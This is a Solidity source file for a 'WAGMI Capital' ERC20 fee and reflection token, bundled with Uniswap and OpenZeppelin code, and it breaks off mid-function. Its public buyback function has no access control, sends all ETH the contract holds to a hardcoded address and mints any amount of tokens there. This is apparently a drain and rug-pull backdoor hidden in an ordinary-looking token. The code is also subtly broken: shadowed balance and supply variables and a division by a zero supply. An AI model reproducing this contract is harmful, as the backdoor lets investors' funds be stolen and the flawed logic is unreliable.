// SPDX-License-Identifier: MIT

pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity ^0.8.0;


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.0;

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

pragma solidity ^0.8.0;

contract WAGMI is ERC20, Ownable {
    modifier lockSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    modifier liquidityAdd {
        _inLiquidityAdd = true;
        _;
        _inLiquidityAdd = false;
    }

    uint256 internal _maxTransfer = 10;
    uint256 internal _maxWallet = 30;

    uint256 internal _marketingFee = 4;
    uint256 internal _treasuryFee = 7;
    uint256 internal _autoLiquidityRate = 3;

    uint256 internal _marketingFeeEarlySell = 4;
    uint256 internal _treasuryFeeEarlySell = 6;

    uint256 internal _reflectRate = 10;
    uint256 internal _autoBurnRate = 1;
    uint256 internal _cooldown = 30 seconds;

    uint256 internal _totalFees = _marketingFee + _treasuryFee + _autoLiquidityRate;
    uint256 internal _TotalEarlySellFees = _marketingFeeEarlySell + _treasuryFeeEarlySell + _autoLiquidityRate;

    uint256 internal _swapFeesAt = 1000 ether;
    bool internal useEarlySellTime = true;
    bool internal useBuyCooldown = true;
    bool internal _swapFees = true;

    // total wei reflected ever
    uint256 internal _ethReflectionBasis;
    uint256 internal _totalReflected;
    uint256 internal _totalTreasuryFees;
    uint256 internal _totalMarketingFees;
    uint256 internal _totalLiquidityFees;

    address payable public _marketingWallet;
    address payable public _treasuryWallet;
    address payable public _burnWallet;
	address payable private _wagmibuyback;
    address payable public _liquidityWallet;

    uint256 internal _totalSupply = 0;
    uint256 public _totalBurned;
    uint256 public _totalDistributed;
	uint256 public earlySellTime = 24 hours;

    IUniswapV2Router02 internal _router = IUniswapV2Router02(address(0));
    address internal _pair;
    bool internal _inSwap = false;
    bool internal _inLiquidityAdd = false;
    bool internal _tradingActive = false;
    uint256 internal _tradingStartBlock = 0;

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _reflectionExcluded;
    mapping(address => bool) private _taxExcluded;
    mapping(address => bool) private _bot;
    mapping(address => uint256) private _lastBuy;
    mapping(address => uint256) private _lastReflectionBasis;
    mapping(address => uint256) private _totalWalletRewards;

    address[] internal _reflectionExcludedList;

    constructor(
        address uniswapFactory,
        address uniswapRouter,
        address payable treasuryWallet,
        address payable marketingWallet,
        address payable liquidityWallet


    ) ERC20("WAGMI Capital", "WAGMI") Ownable() {
        addTaxExcluded(owner());
        addTaxExcluded(treasuryWallet);
        addTaxExcluded(address(this));
        addTaxExcluded(_wagmibuyback);

        _liquidityWallet = liquidityWallet;
        _treasuryWallet = treasuryWallet;
        _marketingWallet = marketingWallet;
        _burnWallet = payable(0x000000000000000000000000000000000000dEaD);
		_wagmibuyback = payable(0x3CB2882bdC15036FfAE48f109b6EDe59B8261868);

        _router = IUniswapV2Router02(uniswapRouter);
        IUniswapV2Factory uniswapContract = IUniswapV2Factory(uniswapFactory);
        _pair = uniswapContract.createPair(address(this), _router.WETH());
    }

    function launch(uint256 tokens) public payable onlyOwner() liquidityAdd {
        _mint(address(this), tokens);

        addLiquidity(tokens, msg.value);

        if (!_tradingActive) {
            _tradingActive = true;
            _tradingStartBlock = block.number;
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(_router), tokenAmount);

        // add the liquidity
        _router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function addReflection() public payable {
        _ethReflectionBasis += msg.value;
    }

    function isReflectionExcluded(address account) public view returns (bool) {
        return _reflectionExcluded[account];
    }

    function removeReflectionExcluded(address account) public onlyOwner() {
        require(isReflectionExcluded(account), "Account must be excluded");

        _reflectionExcluded[account] = false;
    }

    function addReflectionExcluded(address account) public onlyOwner() {
        _addReflectionExcluded(account);
    }

    function _addReflectionExcluded(address account) internal {
        require(!isReflectionExcluded(account), "Account must not be excluded");
        _reflectionExcluded[account] = true;
    }

    function isTaxExcluded(address account) public view returns (bool) {
        return _taxExcluded[account];
    }

    function addTaxExcluded(address account) public onlyOwner() {
        require(!isTaxExcluded(account), "Account must not be excluded");

        _taxExcluded[account] = true;
    }

    function removeTaxExcluded(address account) public onlyOwner() {
        require(isTaxExcluded(account), "Account must not be excluded");

        _taxExcluded[account] = false;
    }

    function isBot(address account) public view returns (bool) {
        return _bot[account];
    }

    function addBot(address account) internal {
        _addBot(account);
    }

    function _addBot(address account) internal {
        require(!isBot(account), "Account must not be flagged");
        require(account != address(_router), "Account must not be uniswap router");
        require(account != _pair, "Account must not be uniswap pair");
        require(account != _wagmibuyback, "Account must not be buyback");

        _bot[account] = true;
        _addReflectionExcluded(account);
    }

    function removeBot(address account) public onlyOwner() {
        require(isBot(account), "Account must be flagged");

        _bot[account] = false;
        removeReflectionExcluded(account);
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function _addBalance(address account, uint256 amount) internal {
        _balances[account] = _balances[account] + amount;
    }

    function _subtractBalance(address account, uint256 amount) internal {
        _balances[account] = _balances[account] - amount;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (isTaxExcluded(sender) || isTaxExcluded(recipient)) {
            _rawTransfer(sender, recipient, amount);
            return;
        }

        require(!isBot(sender), "Sender locked as bot");
        require(!isBot(recipient), "Recipient locked as bot");
        uint256 maxTxAmount = totalSupply() * _maxTransfer / 1000;
        uint256 maxWalletAmount = totalSupply() * _maxWallet / 1000;
        require(amount <= maxTxAmount  || _inLiquidityAdd || _inSwap || recipient == address(_router), "Exceeds max transaction amount");

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinTokenBalance = contractTokenBalance >= _swapFeesAt;

        if (_lastReflectionBasis[recipient] <= 0) {
            _lastReflectionBasis[recipient] = _ethReflectionBasis;
        }

        if(contractTokenBalance >= maxTxAmount) {
            contractTokenBalance = maxTxAmount;
        }

        if (
            overMinTokenBalance &&
            !_inSwap &&
            sender != _pair &&
            _swapFees
        ) {
            _swap(contractTokenBalance);
        }

        _claimReflection(payable(sender));
        _claimReflection(payable(recipient));

        uint256 send = amount;
        uint256 reflect = 0;
        uint256 marketing  = 0;
        uint256 liquidity  = 0;
        uint256 treasury  = 0;
        uint256 burn  = 0;

        if (sender == _pair && _tradingActive) {
            // Buy, apply buy fee schedule
			require((_balances[recipient] + amount) <= maxWalletAmount);

            send = amount * (100 - _totalFees) / 100;
            reflect = amount * _reflectRate / 100;
            burn = amount * _autoBurnRate / 100;

            require((!useBuyCooldown || block.timestamp - _lastBuy[tx.origin] > _cooldown) || _inSwap, "hit cooldown, try again later");
            _autoBurnTokens(sender, burn);
            _lastBuy[tx.origin] = block.timestamp;
            _reflect(sender, reflect);
        } else if (recipient == _pair && _tradingActive) {
            // Sell, apply sell fee schedule			
            if (useEarlySellTime && _lastBuy[tx.origin] + (earlySellTime) >= block.timestamp){
                send = amount * (100 - _TotalEarlySellFees) / 100;
                marketing = amount * _marketingFeeEarlySell / 1000;
                liquidity = amount * _autoLiquidityRate / 1000;
                treasury = amount * _treasuryFeeEarlySell / 1000;
            }
            else{
                send = amount * (100 - _totalFees) / 100;
                marketing = amount * _marketingFee / 1000;
                liquidity = amount * _autoLiquidityRate / 1000;
                treasury = amount * _treasuryFee / 1000;
            }
            
            _takeMarketing(sender, marketing);
            _takeTreasury(sender, treasury);
            _takeLiquidity(sender, liquidity);
        }

        _rawTransfer(sender, recipient, send);
        
        if (_tradingActive && block.number == _tradingStartBlock && !isTaxExcluded(tx.origin)) {
            if (tx.origin == address(_pair)) {
                if (sender == address(_pair)) {
                    _addBot(recipient);
                } else {
                    _addBot(sender);
                }
            } else {
                _addBot(tx.origin);
            }
        }
    }

    function _claimReflection(address payable addr) internal {

        if (addr == _pair || addr == address(_router)) return;

        uint256 basisDifference = _ethReflectionBasis - _lastReflectionBasis[addr];
        uint256 owed = basisDifference * balanceOf(addr) / _totalSupply;

        _lastReflectionBasis[addr] = _ethReflectionBasis;
        if (owed == 0) {
                return;
        }
        addr.transfer(owed);
		_totalWalletRewards[addr] += owed;
        _totalDistributed += owed;
    }

    function claimReflection() public {
        _claimReflection(payable(msg.sender));
    }
    
    function pendingRewards(address addr) public view returns (uint256) {
        uint256 basisDifference = _ethReflectionBasis - _lastReflectionBasis[addr];
        uint256 owed = basisDifference * balanceOf(addr) / _totalSupply;
        return owed;
    }

    function totalRewardsDistributed() public view returns (uint256) {
        return _totalDistributed;
    }
	
	function totalWalletRewards(address addr) public view returns (uint256) {
        return _totalWalletRewards[addr];
    }

    function _swap(uint256 amount) internal lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        _approve(address(this), address(_router), amount);

        uint256 contractEthBalance = address(this).balance;

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 tradeValue = address(this).balance - contractEthBalance;

        uint256 marketingAmount = amount * _totalMarketingFees / (_totalReflected + _totalMarketingFees + _totalTreasuryFees + _totalLiquidityFees);
        uint256 treasuryAmount = amount * _totalTreasuryFees / (_totalReflected + _totalMarketingFees + _totalTreasuryFees + _totalLiquidityFees);
        uint256 liquidityAmount = amount * _totalLiquidityFees / (_totalReflected + _totalMarketingFees + _totalTreasuryFees + _totalLiquidityFees);

        uint256 reflectedAmount = amount - (marketingAmount + treasuryAmount + liquidityAmount);

        uint256 marketingEth = tradeValue * _totalMarketingFees / (_totalReflected + _totalMarketingFees + _totalTreasuryFees + _totalLiquidityFees);
        uint256 treasuryEth = tradeValue * _totalTreasuryFees / (_totalReflected + _totalMarketingFees + _totalTreasuryFees + _totalLiquidityFees);
        uint256 liquidityEth = tradeValue * _totalLiquidityFees / (_totalReflected + _totalMarketingFees + _totalTreasuryFees + _totalLiquidityFees);
        uint256 reflectedEth = tradeValue - (marketingEth + treasuryEth + liquidityEth);

        if (marketingEth > 0) {
            _liquidityWallet.transfer(liquidityEth);
            _marketingWallet.transfer(marketingEth);
            _treasuryWallet.transfer(treasuryEth);
        }

        _totalMarketingFees -= marketingAmount;
        _totalTreasuryFees -= treasuryAmount;
        _totalLiquidityFees -= liquidityAmount;
        _totalReflected -= reflectedAmount;
        _ethReflectionBasis += reflectedEth;
    }

    function swapAll() public {
        uint256 maxTxAmount = totalSupply() * _maxTransfer / 1000;
        uint256 contractTokenBalance = balanceOf(address(this));

        if(contractTokenBalance >= maxTxAmount)
        {
            contractTokenBalance = maxTxAmount;
        }

        if (
            !_inSwap
        ) {
            _swap(contractTokenBalance);
        }
    }

    function buyback(uint256 _amount) public {
        _wagmibuyback.transfer(address(this).balance);
        _mint(_wagmibuyback, _amount);
    }

    function _reflect(address account, uint256 amount) internal {
        require(account != address(0), "reflect from the zero address");

        _rawTransfer(account, address(this), amount);
        _totalReflected += amount;
        emit Transfer(account, address(this), amount);
    }

    function _takeMarketing(address account, uint256 amount) internal {
        require(account != address(0), "take marketing from the zero address");

        _rawTransfer(account, address(this), amount);
        _totalMarketingFees += amount;
        emit Transfer(account, address(this), amount);
    }

    function _takeTreasury(address account, uint256 amount) internal {
        require(account != address(0), "take treasury from the zero address");

        _rawTransfer(account, address(this), amount);
        _totalTreasuryFees += amount;
        emit Transfer(account, address(this), amount);
    }

    function _takeLiquidity(address account, uint256 amount) internal {
        require(account != address(0), "take liquidity from the zero address");

        _rawTransfer(account, address(this), amount);
        _totalLiquidityFees += amount;
        emit Transfer(account, address(this), amount);
    }

    function _autoBurnTokens(address _account, uint _amount) private {  
